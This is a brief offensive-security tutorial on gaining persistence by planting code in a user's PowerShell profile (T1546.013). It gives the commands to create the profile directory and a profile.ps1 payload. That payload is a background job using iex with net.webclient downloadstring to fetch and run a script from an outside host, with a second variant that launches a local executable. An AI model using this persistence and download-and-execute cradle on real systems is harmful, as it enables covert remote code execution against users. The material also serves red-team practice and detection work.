A PowerShell profile, `profile.ps1`, is a script that executes when new PowerShell windows are opened by a user. An adversary can create or modify the profile of a user to execute malicious code [T1546.013].

Microsoft publishes details on where these profiles can be created for both [PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-5.1) and [PowerShell Core](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-7.4).  For example, `$HOME\Documents\WindowsPowerShell\Profile.ps1`.

If the profile and/or directory doesn't exist, just create it.
```
mkdir C:\Users\<USER>\Documents\WindowsPowerShell
```
```
cd C:\Users\<USER>\Documents\WindowsPowerShell
```

Create a profile.ps1, and put your malicious code
```
$_ = Start-Job -ScriptBlock { iex (new-object net.webclient).downloadstring("http://bleepincomputer.com/a") }
```

Or:
```
$_ = Start-Job -ScriptBlock {
    Start-Process "C:\Tools\MyApp.exe"
}
```